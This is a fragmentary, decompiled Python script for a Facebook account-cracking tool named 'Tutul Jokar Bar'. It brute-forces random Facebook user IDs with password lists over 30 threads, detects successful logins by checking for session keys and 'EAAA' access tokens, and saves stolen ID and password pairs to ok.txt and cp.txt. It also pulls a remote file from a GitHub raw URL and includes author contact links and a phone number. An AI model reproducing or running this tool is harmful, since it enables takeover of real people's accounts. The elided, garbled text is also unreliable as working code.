...
# Time Succes decompile : 2022-06-01 55:25:09.173603 
# fuckyou
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Tutul Jokar Bar\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 

 ───────────────────────────────────────────────────────×

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr. Tutul \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Tutul75o \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Name : Tutul Mr. \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/Azley.Ernesto.18"])

	exit("[*] FACEBOOK :  https://www.facebook.com/Azley.Ernesto.18")
...
def notice():
	...
	runtxt(" \033[0;91m[\033[0;97m•\033[0;91m] \033[0;97mAdmin WhatsApp : +923404708884\n")

	print("")

	subprocess.check_output(["am", "start", "https://wa.me/+923404708884"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/YounisJohn/Fuckyou/main/Fuck').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook Page Name : Tutul Jokar Bar \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW Open} %s(Free Tools)"%(G,R,G,Y,B))
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : BEFORE LOGIN Ok Or Cp IDZ ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=Tutul=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=Tutul=Cp=>]  %s|%s\n"%(uid, pw))
				...
				open("cp.txt","a").write("   [=Tutul=CP=>]  %s|%s\n"%(uid, pw))
